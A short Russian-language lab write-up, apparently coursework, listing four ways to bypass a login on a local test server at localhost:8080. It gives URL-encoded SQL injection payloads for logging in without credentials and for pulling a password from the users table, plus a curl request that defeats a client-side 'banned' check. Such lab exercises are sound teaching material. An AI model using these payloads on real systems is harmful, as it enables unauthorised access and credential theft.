## Задание 1 - обойти "защиту" двумя способами:

###     Обойти защиту можно кодированием кавычек. Осуществим вход:
        %27 or 1=1; --
    
###     Войдём под произвольным логином:
        %27 or 1=1 union select %27xexe%27 order by 1 desc; --
    
    
## Задание 2 - обойти клиентскую защиту с помощью curl:
    curl 'http://localhost:8080/signin' \
      -v\
      -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
      -H 'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7' \
      -H 'Cache-Control: max-age=0' \
      -H 'Connection: keep-alive' \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -H 'If-None-Match: W/"a-H50XstGsGKp4UEvDuCvu61ziNnA"' \
      -H 'Origin: http://localhost:8080' \
      -H 'Referer: http://localhost:8080/login.html' \
      -H 'Sec-Fetch-Dest: document' \
      -H 'Sec-Fetch-Mode: navigate' \
      -H 'Sec-Fetch-Site: same-origin' \
      -H 'Sec-Fetch-User: ?1' \
      -H 'Upgrade-Insecure-Requests: 1' \
      -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
      -H 'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"' \
      -H 'sec-ch-ua-mobile: ?0' \
      -H 'sec-ch-ua-platform: "macOS"' \
      --data-raw 'name=Jacob&pass=Jacob&banned=false' \
      --compressed
      
      
## Задание 3 - обойти защиту с помощью кодирования кавычки в альтернативный формат (Url encoded):
    %27 or 1=1; --
    
## Задание 4 - обойти защиту с помощью кодирования кавычки в альтернативный формат (Url encoded) и получить пароль из БД: 
    %27 or 1=1 union select (select min(pass) from users) order by 1 asc limit 1; --
